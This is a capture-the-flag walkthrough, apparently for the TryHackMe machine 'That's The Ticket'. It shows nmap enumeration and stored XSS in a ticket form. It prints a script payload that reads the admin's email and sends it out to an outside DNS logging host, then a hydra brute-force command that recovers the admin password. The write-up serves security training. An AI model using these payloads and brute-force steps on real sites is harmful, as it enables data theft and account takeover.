<h2>Target: 10.10.2.139   That's The Ticket</h2>

<b>Initial Access: </b><br>
nmap -Pn 10.10.2.139 --min-rate=5000 -p-|grep open|awk -F '/' '{print $1}'|tr '\n' ',' <br>
The output from nmap shows open ports 22 and 80.

Enumerating these open ports further with nmap: <br>
nmap -Pn 10.10.2.139 --min-rate=5000 -p 22,80 -sC -sV -oN nmap.ticket <br>
The output shows:

![image](https://user-images.githubusercontent.com/93153300/203627094-3ff36a2e-4fa4-42a7-93cc-6061880b8212.png)
Visiting port 80 shows:

![image](https://user-images.githubusercontent.com/93153300/203627118-98d05af3-b08c-4f24-a953-55315e022870.png)
 
The page indicates that we can log support tickets that IT support will look at.  Based on this, if the site is vulnerable to xss then we should be able to steal their cookie.  To log support tickets we need an account.  So click on ‘register’ and create an account.  After registering an account we are taken to a ‘Dashboard’ page:

![image](https://user-images.githubusercontent.com/93153300/203627155-56ce199a-214f-409a-b9af-4bda94aedf9d.png)
 
To test for xss, we will enter in the ‘Message’ field a simple xss script: <script>alert(1)</script><br>
But before we put in the payload, open the source code to this site to see if we need to add anything else to the payload to make it work.  Opening the source code with ‘control u’ shows:  
 
![image](https://user-images.githubusercontent.com/93153300/203627194-1688d6d7-9c3b-4b60-b855-c943e1b955d6.png)

The source code shows that our payload will enter into a ‘textarea’ tag.  Therefore, to make our payload work we will need to close the ‘textarea’ tag at the beginning of the payload.  Our final payload will look like this: </textarea><script>alert(1)</script>

After inputting the payload in the ‘Message’, click on ‘Create Ticket’. <br>
Upon viewing the ticket we created we get an alert:

![image](https://user-images.githubusercontent.com/93153300/203627221-a72e4cf6-6fe9-4082-adef-697eb2be778b.png)
 
The fact that we got an alert shows that the site is vulnerable to xss.  Usually we would try and steal the  user’s cookie that is looking at our tickets.  However, in this case the user has his cookie set to HttpOnly so we can’t extract the cookie.  Instead, capture the user’s email, as the login page shows that the email is used as his username for login:

![image](https://user-images.githubusercontent.com/93153300/203631696-60ba28c8-3ff1-46b7-b17b-6424c4bd9ba0.png)

Before creating and submitting the ticket, it’s important to know that TryHackMe on the main page to this machine says:

![image](https://user-images.githubusercontent.com/93153300/203627252-beb5470f-632a-4a42-9409-ab400e77e2f7.png)
 
So in order to capture the information from the target we need to go to http://10.10.10.100.  Visiting http://10.10.10.100 and clicking on ‘create a session’ takes us to  http://10.10.10.100/19e9c10d65b72f6bafb34a66fd382269.  This directory is a log page.  The page also shows:
 
![image](https://user-images.githubusercontent.com/93153300/203632722-7a397c92-6e5e-4f4e-986c-4512293cb96a.png)

To get the email we will use the following xss payload: <br>
</textarea><script> <br>
var email = document.getElementById("email").innerText; <br>
email = email.replace("@", "8") <br>
email = email.replace(".", "0") <br>
document.location = "http://"+ email +".19e9c10d65b72f6bafb34a66fd382269.log.tryhackme.tech"</script>

In the xss payload we are replacing the ‘@’ character with an ‘8’, and replacing the ‘.’ character with a ‘0’.  We are doing this because the '@' and '.' characters cause errors in the output.   

Next, submit the ticket with the payload we made to get the email.  Looking back at  http://10.10.10.100/19e9c10d65b72f6bafb34a66fd382269 we see that we received logs showing the user's email address: 
 
![image](https://user-images.githubusercontent.com/93153300/203627270-03ac532a-83ce-44ca-ad1d-3e352dd90ef6.png)

Now that we have the username, adminaccount@itsupport.thm, go back to the login page and use hydra to brute force for the adminaccount@itsupport.thm’s password.  To find the proper parameters we need for hydra we will capture the login request in burp suite:
 
![image](https://user-images.githubusercontent.com/93153300/203627292-350c52bf-4874-4a0e-b9c6-3d8a15fb2ebd.png)

A failed login request returns text to the page saying ‘Invalid email / password combination’.

With this information, we are ready to run hydra: <br>
hydra -l adminaccount@itsupport.thm -P /usr/share/wordlists/rockyou.txt 10.10.2.139 http-post-form "/login:email=^USER^&password=^PASS^:F=Invalid email / password combination"

Hydra found the password ‘123123’.  Log into the account with the email and password.  We can get the flag in the first ticket on the page.  That completes the challenges for this machine.
